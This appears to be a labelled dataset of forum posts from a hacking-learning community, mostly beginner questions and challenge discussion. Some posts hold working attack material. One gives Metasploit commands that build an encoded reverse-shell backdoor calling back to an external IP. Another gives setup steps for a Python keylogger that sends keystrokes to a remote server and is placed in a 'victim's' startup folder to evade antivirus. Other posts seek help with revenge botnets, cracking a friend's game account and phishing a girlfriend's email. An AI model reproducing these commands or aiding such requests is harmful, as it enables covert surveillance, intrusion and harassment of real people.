already, but they didnt work out.  ***any hints in what i should be looking for in the source?*** again, i have no intentions of hacking for evil purposes, and lets be realistic - i dont know anything, im just a mere mortal new to a world inhabited by the gods.  i hope i am not violating any rules and i understand it if you cant help me, because basically i am asking how to hack a site and theres of course no answer which covers everything. anyway, i would be very glad if someone could give me some tips or directions, where to start, you know     well thats about it, and thanks in advance. peace!"
0	How to Write Unmaintainable Code	"this had me rolling on the floor. some gems: never document the units of measure of any variable, input, output or parameter. e.g. feet, metres, cartons. this is not so important in bean counting, but it is very important in engineering work. as a corollary, never document the units of measure of any conversion constants, or how the values were derived. it is mild cheating, but very effective, to salt the code with some incorrect units of measure in the comments. if you are feeling particularly malicious, make up your own unit of measure; name it after yourself or some obscure person and never define it. if somebody challenges you, tell them you did so that you could use integer rather than floating point arithmetic.  declare every method and variable public.[...]if god didnt want us to use global variables, he wouldnt have invented them. rather than disappoint god, use and set as many global variables as possible. each function should use and set at least two of them, even if theres no reason to do this. after all, any good maintenance programmer will soon figure out this is an exercise in detective work, and shell be happy for the exercise that separates real maintenance programmers from the dabblers.   packratting keep all of your unused and outdated methods and variables around in your code. after all - if you needed to use it once in 1976, who knows if you will want to use it again sometime? sure the programs changed since then, but it might just as easily change back, you ""dont want to have to reinvent the wheel"" (supervisors love talk like that). if you have left the comments on those methods and variables untouched, and sufficiently cryptic, anyone maintaining the code will be too scared to touch them.  plenty more.  linked to by /r/programming. -- tue may 24, 2011 6:04 pm -- lets start off with probably the most fiendish technique ever devised: compile the code to an executable. if it works, then just make one or two small little changes in the source code...in each module. but dont bother recompiling these. you can do that later when you have more time, and when theres time for debugging. when the hapless maintenance programmer years later makes a change and the code no longer works, she will erroneously assume it must be something she recently changed. you will send her off on a wild goose chase that will keep her busy for weeks."
1	How to check vulnerablities	i have just helped a friend of mine make a new website. though im concerned with my lack of security knowledge i could never make it into a serious website. so i need some education if you guys were up to it 1.how can i tell if my ports or services on those ports are vulnerable 2. what can someone potentially do with this information. 3. how can i fix this issue thanks ahead for the support  this website was also created using a server administration tool called cpanel
3	Hear Me Out :)	ok lets just get a few things clear here, im solely a programmer, ill reverse engineer protocols and stuff like that, write applications im not interested in injecting anything, so this is the story... i use  some random mice website --sanddbox anyway, long story short, i saw an advert i did not like (killing mice) on a forum where mice are primarily pets, anyway 30 moronic posts later some idiot tells me this  no offence here but you have no idea what your talking about, hackers could not bring this site down. payment information is done via paypal, no personal details of any user are stored on here so what would they hack? this forum and anyone that has made any donations / memberships is more than secure and i make sure of that. also i agree with shiprat, if you dont want to see the adverts pay the 1 pound a month to remove them or dont visit the forum. like as if im going to pay anything to remove that banner when the forum they use is phpbb from 2007, and they expect me to pay 1 quid a month to an idiot who cant even be arsed to update his forum, and on top of that claims the site cant be hacked!   no offence here but you have no idea what your talking about, hackers could not bring this site down  lol - phpbb 2007,do you not agree, this statement is crying out hack me ????? -- mon jul 04, 2011 11:39 am -- i think someone should teach this guy a lesson, nothing bad just say deface index.php a wake up call so that prick can update the forum..... its purely in their interest and mine to get him to upgrade lol  disregard this, i suck cocks
1	NewHTML question.	"so, i have passed the first basic challenge and have been studying html.  i am currently confused on how to combine the html and the password forms. i have tested examples that i got from this site and the tutorial, to little sucess. what i am trying to do is have a user enter a password, and then have it jump to another page. but i failed to understand how the two combine. if anyone could help me, that would be great. if not, oh well. this was the code i was using:  code:  select all <form name=""input"" action=""page2.htm"" method=""send""> username: <input type=""password"" name=""abc"" /> <input type=""submit"" value=""submit"" /> </form> p.s. the page i was trying to get was an htm page on my computer titled ""page2"""
3	Password cracking	i was so pissed off about having downloaded a load of pdf files only to find out they were passworded that i decided to try and brute force one of them and to my amazement the little command line tool had the password in under 20 minutes. it was a 4 character password that was a random combination of letters and numbers. i was impressed by this so decided to learn about password cracking. i tried the same thing on a pdf that i put a 5 letter password on (horse) and it took about 3 hours to get the password lol. im guessing a 6 character password would take days. firstly i was wondering about the terminology. is the technique that tries all the words in a word list called a dictionary attack while the technique that tries every combination of characters called a brute force attack or are these kinda attacks all collectively known as brute forcing?  other thing i was wondering is how much ram you would need to brute force (trying every combo of characters) a 10 character password in a reasonable amount of time (under 24 hours). im thinking about the kinda passwords i like to use. dictionary attacks are useless against my passwords and a brute force attack would take my computer years. the pdfcrack program i used only tries combos of letters (both cases) and numbers but didnt include special characters so itd be useless against some of the passwords i use. an example of the kinda passwords i use is $narklers56. its easy to remember because i can sound it out in my head, 56 is a number i like the sound of and i usually arrange the cases so the password looks cool. its very simple how i choose my passwords but its not so simple to crack these kinda passwords with any methods i know of yet. im a noob when it comes to password cracking im guessing some of you here have ways you could crack the kinda passwords i use. then again maybe not since i cant really imagine how there could be an algorithm (besides plain old brute forcing the character combo) to do this kinda thing. that example password up there is one of the stronger passwords i use. i dont use that kinda password for every day shit because it takes too long to type so instead i usually use a similar password but only use lower case letters.  edit:  i just came across this article: http://www.readwriteweb.com/archives/ha ... 123456.php which shows this table listing the most popular passwords from a sample of 32 million passwords: thats a pretty high percentage of the people using these insanely bad passwords so the total percentage of people using weak passwords must be pretty high.
3	Gathering info on a computer user without social engineering	"excluding social engineering techniques and delivering payloads via vulnerable services, how would you go about gathering information on an internet user you know absolutely nothing about? first thing i would do is get their ip by directing them to my webpage (alright that bit involves a bit of social engineering) then id run a whois on their ip to find out about their isp. then id run various nmap scans on their ip to start finding out about their router. thats pretty much all i would know how to do at the moment.  btw heres a story involving info gathering if you wanna read it: about a year ago i got in an argument on youtube with someone on youtube and the guy told me ""im a hacker, im going to hack youtube to get your ip then use it to find out where you live and kill you and your family"" or something to that effect so i decided to play a little prank on him. i gave him a link to a dummy website to get his ip then ran a whois on it. to my surprise his isp was located in zagreb, croatia. found that strange because his english was very good but he didnt seem like he knew enough about it to be using a proxy. anyhow i sent him a pm saying ""by the way whats the weather like in zagreb?"" and he replied saying ""how the fuck did you know im in zagreb?"" and started apologising for threatening me and he seemed to genuinely think i knew where he lived and was frightened for his life. i felt bad and told him i was only joking and tried to explain to him that having someones ip doesnt mean you can get their address but he didnt reply after that lol."
3	Self awareness, consciousness, souls etc	im a programmer. well... i try to become one. i came in 9th in my country at this annual competition. so i have some insight into how computers work. i understand that they are nothing more than reactions on a circuit board made by ingenious people. i keep noticing this trend where people think that the next gen computers could be self aware. like on of the other programmers i had to live with. he kept talking about how computers could store information etc. he didnt get it.  i think. i am self aware because i am not a bunch of circuits storing data. if i was, i might be incredibly sophisticated. i might even act the same way i do now, but i know i am not, because i can observe and experience. its not just electrical signals going through a wire, or any other type of transmitter. sure, there are nerves and there are muscles and brain cells. a computer could try to store data in some way, but it cant really understand it unless i tell it. so i came to the conclusion - theres definitely got to be something more to people right? if you follow simple logic... not the kind of logic that people go to when they are really desperate, but simple straightforward logic, then you realize that no self awareness can exist. so this concept of making self awareness is flawed because it can never be done.  i know they say that the eyes are the gates to the soul or what not and i have indeed found this weird thing. just stand in front of a mirror and look into your eyes for a few minutes. its unbearable! maybe because i am a horrible person or something but i dont really think anybody can endure starring into their own eyes for so long.  i know this might not seem to fit into the ethics forums, but i believe it does, because people keep talking more and more about ai and artificial self awareness. they are dehumanizing people and humanizing robots. this is extremely dangerous. please discuss.
3	Question about the attitude in my solved basic-mission-6	greeting folks, for the basic mission 6, it requires you to used the encrypted password and the encrypt engine to find the decrypted password; i solved the problem, but im not sure whether my attitude/approach is the right way, so i want some opinion/review/advice... what i did was: i keep typing simple word pattern into the encrypt engine and try to find a relationship between the input and output; so its like a blind action, ive no idea would i find anything just by doing so; for this mission, the encryption method is very simple, so i did figure out its algorithm, but what about more complicated method?? since you dont have access (cant see) the encryption method, how is it even possible to just blind figuring the behavior of an encryption process?? so, my question is: if blind-figuring encryption behavior is the correct attitude for now, does it mean that for more complicated encryption, we need to use skills in linear algebra or cryptography?
1	Help needed !!!	hey folks, i know i have probably done a number of things wrong such as post this in the wrong place or something but please forgive me as im fairly new to this.         anyway i was wondering if it was possible to get some help, im currently doing a college project on honeypots and as it stands havent received much traffic at all. and as the deadline creeps closer and closer im starting to panic as of why i have not gotten large amounts of traffic. i was wondering if people could inform me on how to attract some attention fast (i.e which services to run and ports to open), as it stands i have a simple basic file service running and web service running on a windows server 2003 machine.  along with opening my eyes to what im doing horribly wrong i was wondering if it was possible if i gave the ip address of the server out on the post would people who have a few moments run some typical attacks on the server (wont be challenging) so i can gather some traffic or does this go against some rules of this site? finally if it doesnt go against the rules and it is possible for people to have a go at attacking the server i was wondering if it would be possible for those people who do decide to attack the server not to wreck it to much and keep away from editing any important log files as i havent time to re-install and reconfigure everything. thanks for any help in advance much appreciated.
1	Im back...Aain :D	well seeing as i havent posted anything latly, its about time i do. so ive finally gotten my website up withe php script to capture ip address, but now really would like to know something. what ports allow for remote acess to a computer, when i refer to remote access i mean being able to see/manipulate files on that computer. can any port be used for this or is there a certain port needed, or is a program used for this?
1	Backdoor outside of LAN - help	**update** i have been using backtrack 5 to create backdoor executable files using the reverse tcp payload (i used port 443). i realized that this is only effective to slaves located in my lan when using lhost to my internal ip. i tried switching to my external ip to try and make this affect targets outside of my lan, but no luck. i set up port forwarding to port 443 from inside my router settings. it gives me a error and sets the listener to 0.0.0.0:443 instead of using the external ip as it should. i have been trying to resolve this issue for a while.  i even tried setting up an apache server from the backtrack services, and still no luck. i also downloaded, extracted, and ran vanish.sh and tried it instead of using: creating the backdoor.exe file: code:  select all msfpayload windows/meterpreter/reverse_tcp lhost=108.248.*.* lport=443 r | msfencode -e x86/shikata_ga_nai -c 5 -t exe -x /root/desktop/filenamehere.exe -o /root/desktop/backdoor.exe enable the listener for port 443: code:  select all msfconsole use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 108.248.*.* set lport 443 exploit and still no luck!!!!  this is for penetration testing on my end, all help is appreciated! thanks in advance, -ninjex-

1	Help? Please this is not fair..	hello,  hey guys i am new to hackig and i need help on how to creat a botnet. the reasons im trying to creat a bot net is because i play this online game called counterstrike and these couple of guys just keep ddosing ect     . and they just laugh about it so i thought it would be time for some pay back if anyone can teach me how to creat a bot new that would be great and i would thank you alot. quick question.. when youre playing a online witch the one im playing is called counterstrike is it possbile to get someone ip from their , they dont have admin powers or nothing and im  kinda wondering how they keep ddosing me and yes i have a staic ip just have to reset my modem everytime they ddos me and its over but right when i get back into the game it takes them mins to get my i.p and start it again.

1	Fav language?	so no doubt this question has been posted before. the answer is usually along the lines of there is no best language. each have their strengths and weaknesses. but a recent thread here got me thinking that a lot of the big ones out there actually arent made for anything in particular and i would think, provided the context is clearly established, its fair to draw a comparison. i was on  http://projecteuler.net/  back in the day and took a crack at mission 7, which is to find the 10,001st prime number. i solved this in c++ coz that was the language i was playing with at the time . now heres the question, which language would you use to solve this challenge? its purely mathimatical and only requires one integer as an output. im pretty sure any language worth mentioning is more than capable of implamenting a solution without too much trouble, so methinks its just a matter of personal taste. thoughts?
3	HTS live stream part two	"made a new thread because editing and posting to the old one doesnt bump it.  just want people to see a decent tutorial. how about this for an idea. ""network hacking and dangerous underestimations"" with my recent run in with my mystery hacker, i decided that for a live stream i will be using windows and easy freeware (wireshark, cain, etc.) to show how dangerous it is to underestimate someone for their programs. with just cain and and a wireless bridge, i can drive around my neighborhood and pick up all lan traffic on insecure networks. not only that, but if i go as far as using airpcap (something i dont have, but will example obviously) i can sit there and monitor traffic, building up passwords to some routers, cracking them, giving me access. obviously, all examples i show will be on my own networks, so no need to worry about the legality with hts being even slightly involved with the live stream. i will be using more than just cain for sure, but ill try to keep the demonstrations free or extremely low budget, to show that even the less-wealthy pen testers are able to get pretty far.  i hope this will also help people understand that you dont need thousand dollar airpcap drives, dont need to spend money on blue tooth and war driving software/equipment, and dont need to be on a linux based os (this kills me a bit) to be successful. by the way, my mystery hacker spoofed his mac, which pisses me off.  on the bright side, local authorities have agreed to look in to the matter, and my internet provider agreed to wipe the history of our little scoundrel off my record (they didnt need the police report either, they just said patterns in the area were suspicious enough to allow a clean up.) so, sound like a good idea?"
1	Help for a beginner. Looking for your input.

3	Beyond programming 3	"hey guys! i want to thank you for everything you do here. i am soon to begin working as a penetration tester and i would be lying it isnt because of you guys work and this awesome website! ive heard in irc that ""this is not a representation"" or the real world and shit like that, and while i agree, this is a very didactic way of teaching very complex topics, providing all the suport yet no help beyond ""you can do it"" or ""look up x concept"". i think it is awesome. on my track to learning more and challenging myself, around 4 years ago, i started to attempt to defeat challenge programming 3. today, i finished it. took me around 700 loc between unit tests and real code, around 5 full rewrites and lots of time but i implemented a recursive solution in python. of course i wasnt always trying, but i always had it on the back of my mind. understanding more of the domain of the challenge, it made me wonder more things about the encryption algorightm: what is the name of the algorithm i implemented a known-plaintext attack for? would this algorithm be considered safe if there are no known plaintexts? why not? what could be done to prevent known plaintext attacks like in this situation?  and this is maybe for myself, what of what i learnt be applied to other encryption algorithms? thanks for all the awesomeness!  pedro -- tue sep 10, 2013 5:20 am -- looking at other peoples solutions, not feeling so smart now heh also, this guy says you can get that without getting the hash in less than a few settings. bitsniper wrote: #1: determining the hash of the password is not necessary i did not do this.  i read that some other people tried this approach but i found it unnecessary.  you can still find the solution without knowing the md5 hash of the password.  anyone that says determining the md5 hash of the password is necessary will be ignored (and possibly ridiculed) whats up with that?"
1	God Please HACK This Site	please god, just hack this disgusting sexist site, which was created by an id*ot:  *removed* please notice that im not asking anyone of you to hack the site, so this is  legal . yep, it is. (please think of your mother)  im just praying to god here . (please think of your little sister if you have one) yeah, totally. and if you dont care about god, thats perfectly fine too. just be your own god/goddess, and save the day! how you ask? by totally -not- hacking that site, of course, my friend! (please think about your granny) btw, this thread isnt pointless at all.  id like to know your opinions about sexism . no kidding, thats why im posting this.

1	Pen Testing Project	hi all,  im a third year undergraduate studying computer forensics and it security. im very interested in pen testing/ethical hacking and have decided to do my final year project on the subject. im not exactly a novice on the subject but i am far (like observable universe far) from an expert. ideally i want to simulate a small business network (maybe a online retail shop or something) and hack into it, thus simulating/completing a pen test. the goal of the project is to create a pen test report and a document that could be used to improve awareness of vulnerabilities and thus solutions for small local businesses that could suffer greatly from an attack and are looking to beef up security.  im having a problem with setting up the network in a realistic way; trying to realistically simulate a online shop is obviously an issue without spewing traffic and my own credit card numbers everywhere so ive decided to go against the online retail idea and use just a generic small business network.  im gonna have metasploitable as one of the virtual machines on the network and implement the use of a sonicwall firewall (i can get my hands on one of them) to test the differences in how hard the network is to hack with/without firewalls, but aside from this im pretty stumped on what physical/virtual machines to put in the network to simulate a business network.  my question essentially is has anyone here ever via experiment done anything similar? and is there any other simulations like metasploitable out there that could be used on the network?  also any input would be greatly appreciated and thanks in advance for the help.  paul

1	What should I learn?	okay so down to buisness, what programing languages should i learn in order to become a proficient hacker. i am already acquainted with python, c++,some basic, html, and am currently trying to learn java script. oh yes im also currently learning some unix/gnu commands. so yeah if anyone has any pointers or advice it would help, and if any one knows any good websites or forums that have good information it would be appreciated, thank you.
1	Can I ask for Help?	ive been trying to learn those missions, but to no avail, if i havent got a hint, i wont be able to finish a mission because, i want to try to hack a site.. ive been playing a game for more than 1 year now... but, i think the game is rigged.. they have a site that you can try your luck or gambling successes.. up until now, im seeing players that has ingame items that i could only dream of having in the game.. whats more infuriating is that they only have played for about a month or so and not even using real monetary loads to buy things.. (as i did) url edited out by logical__ the site has something like a lucky pick.. [20php/roll] press the button, then the site presumably uses a random number to pick things.. (i always get that animal cracker[8php only]      ) is this site hackable? would it be able to just make it pick a certain item only? [perfect e-repair] if so, could you teach me how? the game has maintenance every wednesday 10am to 12pm sorry about not mentioning the games name, im trying to be subtle about the games name so that no one could search it in search engines.. thus reducing the risk of the developers of that site to trace your site...

(interesting) so for safety reasons im not going to post the actual link. though if you want to look into it its not that hard to find. if this service does actually work to their claims that would be very neat little tool to have. also im looking into how to reverse it."
1	other forums? to talk maybe?	hi, i have a friend called robin, he has been my friend for about 7 years , but since a week ago, he has done things to me that  i really dont want to talk about here  , but anyway since im not that person to just tell someone , about my problem and let them fix it , im gonna take action and do something that hurts him. he has hurt me in many ways, but as i said i dont want to talk about them here, i just need to do something to him, thats the kind of person i am. so thats my im asking you all, to maybe give me a call on skype or something like that because i dont have the knowledge to make him suffer, altough you may have, i would like to cooperate with someone to make an attack on his compute thats not to bad but it still makes damage, but the one thing i really want to do is this, he is league of legends addicted, he is really addcited to it and i would like to crack his lol account. this is my request, sorry if im breaking site rules or something but this is for my sake, i want to take my revenge for all the things he did to me,  -frag0
2	A nasty flash virus	i was at armor games.com and saw a cool looking new game someone uploaded and when i tried to play it, of course it worked and the game was cool but when i finally completed the game as i had nothing else to do at that time it asked if i wanted to save my score so i could start the game again with the score i already got so i clicked ok and right after that suddenly the page refreshed and said i wasnt allowed to go on the internet then suddenly a very strange anti virus popped up which was never on my computer before and it completely locked me out of the internet, my administrator account, task manager and locked me out of resedit and command prompt plus it disabled my anti virus and whenever i tried to start my anti virus it popped up in its place as my default anti virus soon this new anti virus said i had over 2,000 virus on my computer and said that my c: drive was infected and wanted to delete this but it asked for 200$ to activate it first it took me forever to delete this fake anti virus with the help of a tech forum but there was 1 part i could never get rid of, the fake anti viruss legacy a weak google redirect virus which whatever i tried i couldnt get rid of it but it is weak so it not that much of a new seance  and gus what?   armor games did remove this game a few days later and banned the user who uploaded it so always be careful even if its a flash game

1	Proxy Encrypted Authentication	good afternoon hts, im hopefully getting some more computing power soon and i hope to set up my own custom proxy server on port 80 by use of a special program running on the client side which securely tunnels straight to the server. my idea is to have it at least partially encrypted to prevent any firewall from snooping it and detecting something suspicious. note that this is designed to deter anyone who hasnt passed a basic cryptography course, so im not getting to fancy with it. i welcome any to test out the authentication process of it for any weaknesses (besides data tampering, or else i would have added a mac on the end of it).  the basic idea is simple, the server generate a 512 byte long cert (certificate) and a 512 byte ckey (certificate key) and stores both of them in a database. one cert and ckey pair is given manually (in the form of .cfg files) to each user to uniquely identify them.  when the proxy software on the client wants to connect to the server, it generates a 512 byte random pad used for authentication called apad, and sends the server this: cert xor ckey || ckey xor apad ( || is appending) if the server compares the given cert xor ckey with all of its own database and if it successfully finds the user, it extracts the apad from the client message, and it generates a new 512 byte key called newckey, and also generates 2 512 byte temporary passwords called tkeyc (temporary key client) and tkeys (temporary key server), then it sends this: apad xor newckey || apad xor tkeyc || apad xor tkeys from there, both the server and client replace ckey with newckey in their files for use during the next authentication process, and the tkeyc and tkeys are then used in vigenère cipher to communicate in secrecy (its not secure, i know, but it will fool the firewall, and thats all i care). what do you guys think of this scheme?  - wallshadow   <3
3	A friendly challenge.	hey, everybody. im not sure if this is the proper thread, but it seemed so to me. my two roommates and i have been talking about taking up hacking, but just between our own computers. i have heard that some of the steps one takes in order to hack can actually make their computer more vulnerable to other hackers. im not sure if this is reliable informaion, if someone could clarify id appreciate it. anyway, the scenario we want is to be completely vulnerable only to eachother. this way we can hack eachother while trying to keep from being hacked. its basically a troll war were all agreeing to. were all pretty new, so it might be a while yet before we can get anything interesting to happen. the main question i have is what resources have you found helpful (especially when you were first beginning)? im pretty new to it, and honestly i cant say i know where to start. im prepared and willing to study scripts, and coding, and whatnot, but ive only recently began dabbling in command prompts and source codes (the site missions are awesome by the way, i cheated on 4 though).  hopefully, someone could shed some insight to get me started. thank you!
1	Help finding old accounts	i was wondering the other day if it where possible to find all accounts you ever created on the internet? maybe if you signed up to every account properly, using correct names and addresses then i thought maybe it would be possible? maybe even using old ip addresses if you had written them down somewhere. anyway i was trying to find out my password for 2 old hotmail accounts i had. i think if i could look through my old emails i could find all my old account usernames for sites and forums i had forgotten about, including this one! i have tried to do the password reset, and then even fill out that form but they ask you questions about the titles of your last emails and the people you sent them to. how am i going to remember that when i was 13/14 and im 23 now?     any help would be great!
3	HTS Cryptography Challenge 1	"hey hts, im david, and i want to ask a favor of everyone. ive been worried about getting fired form ellington mineral company for a while, so i decided to have a look around my bosss computer. i found this encryption program and encrypted file named ""davidb.enc"" in a folder called ""emailbackups"". i looked at the program a bit, but ive hit a brick wall. i cant figure out how to break the encryption. heres what ive found: its a custom made encryption program that doesnt exist anywhere else on the internet. he left the source code right next to the program. the key looks like its 4 bytes long. maybe brute force attack might work? theres a test program that comes with it, but im not entirely sure what it does. i attached the encryption and decryption source codes as well as the encrypted file. ive also attached the test program, might come in handy. thanks so much, davidb. http://randomsite.net78.net/testing/upload/fenc.java http://randomsite.net78.net/testing/upload/fdec.java http://randomsite.net78.net/testing/upload/davidb.enc http://randomsite.net78.net/testing/upl ... ptora.java made by wallshadow and evilp4wn <3"
1	Hacking a Target that only uses a phone for internet	so i have been trying to hack into the any or all , gmail / yahoo / facebook accounts of my gf.   however, i am limited as she only uses a cell phone and does not log onto any computers.   this is problematic as i cant i cant rat or keylog. i tried to phish with a cloned website from using backtrack, however that tool tool doesnt render the site in a mobile browser. i tested the cloned page on my computer browser and it worked fine.  however i sent it to my andriod and ipad and it would not load the site on either.   if anyone has any ideas on what methods might be beneficial to research i would greatly appreciate the help.  it seems like everything i read is based for regular computers.   also as far as guessing secret questions, i tried.  i have no idea what they are they are too random for me to bring that up. thanks in advance..
0	Cryptlog - A python keylogger	"hello all! i recently made a simple (well, not very simple, but i digress) windows only (   ) keylogger in python and php.  heres the basics of how it works: 1.) captures keys in chunks of 25 keystrokes. 2.) encrypts the keystrokes with a simple xor encryption (not very good encryption mind you.) 3.) sends the encrypted keystrokes off to a server that will record them.  the server can deal with multiple clients (keyloggers) running at once, and will still display the keystrokes fine. edit: its on github now, so i dont need to worry about updating it here     cryptlog on github! heres from the readme: heres what you need to do to start logging keystrokes: 1.) download  pyhook .  you only need pyhook to be on the computer you use to build the keylogger. 2.) edit the ""cryptlog.py"" file.    a.) replace ""thisiswhereyourkeygoes"" with whatever key you want to encrypt the data with.    b.) change "" http://www.yoursite.com/droplogs.php "" to whatever your site is. (need a good freehost?  pm me.) 3.) edit the ""viewlogs.py"" file.    a.) change "" http://www.yoursite.com/ "" to the name of your site. 4.) edit the ""droplogs.php"" file.    a.) change ""keyloggerlogfiles.txt"" to the name of the file you want to keep logs in. 5.) upload ""droplogs.php"" to your site. 6.) compile the file(s).    a.) download ""pyinstaller 2.0"" ( http://www.pyinstaller.org/ )    b.) run ""python pyinstaller.py -f --name=cryptlog -w patho\cryptlog.py"" where ""patho\cryptlog.py"" is the relitive path pointing to cryptlog.py.  you *must* run this in pyinstallers directory.    c.) *optional*   run ""python pyinstaller.py -f --name=viewlogs patho\viewlogs.py"" where ""patho\viewlogs.py"" is the relitive path pointing to viewlogs.py.  you *must* run this in pyinstallers directory. 7.) put ""cryptlog.exe"" into the victims startup folder, or, better yet, into the startup registry key. 8.) run ""viewlogs.exe"" or ""viewlogs.py"" and type in the name of the logfile that you set in setp 3a.  then, type in the id of the log that you want to view.  each time cryptlog.exe starts up, it creates a new log with a new id.  next, type in what you used as your key in step 1a.  from there, you should be able to view the logs of the keystrokes. 9.) *optional* send me an email telling me how much you love/hate cryptlog.  my email (or, rather, the evil ninja hackers email) is "" enh@lavabit.com "" have fun, 3vilp4wn. if you need help setting it up, just post here or pm me. anyways, thats all. it takes a bit to set up, but once you set it up, you can use the same.exe all the time    its also hard for antivirus to detect, because each .exe is different. have fun, 3vilp4wn"
1	Virtual box	so i am trying to learn how to use virtual box (i run a mac) and i was going to set up a mac first so i could learn how. i set it up but now its just a terminal like thing that says code:  select all uefi interactive shell v2.0. uefi v2.31 (edk 2, 0x00010000). revision 1.02 mapping table     blk0: alias(s):         pciroot (0x0) /pci (0x1f, 0x1) / ata (0x0)     blk1: alias(s):         pciroot (0x0) /pci (0x1f, 0x2) / sata (0x0, 0x0, 0x0) press esc in 3... 2... 1... seconds to skip startup.nsh or any other key to continue. 2.0 shell> and the 2.0 shell> runs like a terminal. what did i do wrong, or what do i need to do next? *edit* and if it helps at all, here is a picture of my virtual macs info  https://sphotos-b.xx.fbcdn.net/hphotos- ... 5068_n.jpg
3	Ninjexs Challenge 03	"hello, fellow members of hts! i have put together a nice little challenge for you guys, and i hope you guys enjoy it, as much as i enjoyed making it.  (flashes back to spending 4+ hours trying to get a db to take queries case insensitively, when it does that by default #facepalm) first, you will need to grab a copy of the challenge03.zip file located at: https://www.dropbox.com/s/rqucsjssl5x64 ... enge03.zip next, you of course will need to extract the folder. the folder contains the details for the challenge completion located in the readme file, which is: code:  select all message from: zyrux ""hello, i heard that you are an amazing hacker. i myself have some skills in my toolbox, but i hit a road bump today. i was wondering if you could help me out with this little issue. basically, there is a guy who is wanted for murder. they say that he lures people from the internet. the problem is that the fbi can not seem to get a trace on this guy. so i decided i would see what i could do. i managed ssh into his machine and pull a folder called ""meet"". i believe this file contains the information somewhere about his next attack. however, upon opening it, i get presented with a encrypted file named ""encrypt.txt"". this needs to be decoded. i found where he has been using his encryption algorithm, it is located at http://missions.securityspot.org/03/manipulate.html  the rest of the information, i have no idea about, there is a file called jpg-gpg, which contains three files (xaa, xab, xac) with no extensions... please, if you can help me track this killer so we can put him behind bars, i would much appreciate it. thanks in advance, - zyrux"" ----------------------------------------- some things to note: the website given should be used only to understand the encryption method. feel free to look around it, etc if you wish. you will not be able to sign-up, transfer files, recieve files, or login. the logo on the home page contains a link (http://missions.securityspot.org/03/check.html) which will allow you to check if your password is correct.  i hope you all enjoy the challenge! happy hacking, - ninjex"
